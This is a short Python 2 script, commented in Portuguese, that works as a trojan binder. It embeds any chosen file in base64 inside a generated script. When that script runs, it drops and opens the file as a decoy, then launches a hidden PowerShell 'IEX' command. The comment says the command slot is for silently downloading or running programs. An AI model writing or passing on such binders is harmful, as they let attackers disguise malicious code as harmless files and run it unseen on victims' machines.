# -*- coding: utf-8 -*-
import os, base64
arquivo1 =  raw_input("Arquivo 1: ")
nome_arquivo1 = os.path.basename(arquivo1)


with open (arquivo1, 'rb') as arquivo1_aberto:
    with open('arquivo_final.py', 'w') as arquivo_criado:
        arquivo_criado.write('''import os, base64
        # -*- coding: utf-8 -*-
        def join(conteudo_binario, nome_arquivo):
            if not os.path.exists(os.environ["TEMP"]+"\\\\"+nome_arquivo):
                with open(os.environ["TEMP"]+"\\\\"+nome_arquivo,"wb") as arquivo_temporario:
                    arquivo_temporario.write(conteudo_binario)
            os.startfile(os.environ["TEMP"]+"\\\\"+nome_arquivo)
            cmd = "powershell.exe -nop -w hidden -c IEX (SEU COMANDO AQUI)" #você pode solicitar o download a algum arquivo na internet, execução de algum .exe ou qualquer outra coisa via powershell, o hidden significa que não será exibido nada na tela, tudo invisível
            os.popen(cmd)
        arquivo1_base64 = "%s"
        join(base64.b64decode(arquivo1_base64), "%s")
            '''%(base64.b64encode(arquivo1_aberto.read()),nome_arquivo1))
